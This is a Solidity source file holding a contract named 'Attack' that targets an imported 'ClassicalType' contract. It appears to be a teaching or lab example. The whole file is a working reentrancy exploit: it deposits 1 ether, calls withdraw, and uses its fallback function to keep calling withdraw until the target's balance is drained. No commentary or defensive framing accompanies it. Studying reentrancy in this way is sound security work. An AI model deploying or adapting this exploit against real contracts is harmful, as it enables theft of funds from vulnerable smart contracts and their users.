// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import {ClassicalType} from "./ClassicalType.sol";


contract Attack {
    ClassicalType public ct;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _ct) {
        ct = ClassicalType(_ct);
    }

    function attack() public payable {
        require(msg.value >= AMOUNT, "MAKE ENOUGH DePOSIT");
        ct.deposit{value: AMOUNT}();
        ct.withdraw();
    }

    fallback() external payable {
        if (address(ct).balance >= AMOUNT) {
            ct.withdraw();
        }
    }
}
